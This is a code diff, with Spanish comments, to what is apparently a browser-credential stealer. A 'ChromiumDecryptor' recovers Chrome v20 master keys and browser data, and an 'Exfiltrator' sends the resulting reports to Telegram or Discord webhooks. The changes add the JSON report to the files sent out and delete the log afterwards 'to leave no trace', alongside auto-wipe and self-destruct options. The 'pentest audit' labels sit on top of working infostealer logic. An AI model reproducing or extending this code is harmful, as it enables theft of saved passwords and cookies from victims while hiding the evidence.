@@ -315,7 +315,7 @@ class ChromiumDecryptor:
 
             try:
                 import importlib
-                v20_module = importlib.import_module('chrome_v20_decryption.v20_decryptor')
+                v20_module = importlib.import_module('modules.chrome_v20_decryption.v20_decryptor')
                 aes_key = v20_module.get_v20_key(app_bound_b64, win32crypt)
                 if aes_key:
                     logger.debug(f"Master key AES (v20) obtenida ({len(aes_key)} bytes) para: {user_data_path}")
@@ -603,7 +603,7 @@ def main():
     
     out = _setup_environment(args.output_dir, start_logging=True)
     if args.clean:
-        for ext in ("*.html", "*.csv", "*.json"):
+        for ext in ("*.html", "*.csv", "*.json", "*.log"):
             for f in out.glob(ext): f.unlink()
         return
     
@@ -617,6 +617,7 @@ def main():
     auditor = ChromiumDecryptor()
     results, hp, cp = auditor.audit(out, args.no_html, args.no_csv, args.browser, auto_kill=args.auto_kill)
     
+    jp = None
     if results and args.json:
         jp = out / f"audit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
         with open(jp, 'w', encoding='utf-8') as f: json.dump(results, f, indent=4, ensure_ascii=False)
@@ -624,13 +625,19 @@ def main():
     # auto_exfil puede ser desactivado desde el CONFIG embebido (Builder) o con --no-exfil
     if results and not args.no_exfil and CONFIG["auto_exfil"]:
         exf = Exfiltrator(tg_t, tg_c, ds_w, timeout=args.delay or 15)
-        files = [p for p in (hp, cp) if p and p.exists()]
+        # Incluir JSON en los archivos a enviar si existe
+        files = [p for p in (hp, cp, (jp if results and args.json else None)) if p and p.exists()]
         if files:
             exf.send_files(files)
             # Auto-wipe local reports tras exfiltrar, a menos que --no-wipe esté activo
             if not args.no_wipe and (tg_t or ds_w):
                 for p in files:
                     p.unlink(missing_ok=True)
+                # Cerrar y borrar el log también para no dejar rastro
+                shutdown_logging()
+                log_file = out / "pentest_audit.log"
+                if log_file.exists():
+                    log_file.unlink(missing_ok=True)
         
         if args.self_destruct:
             exf.self_destruct()
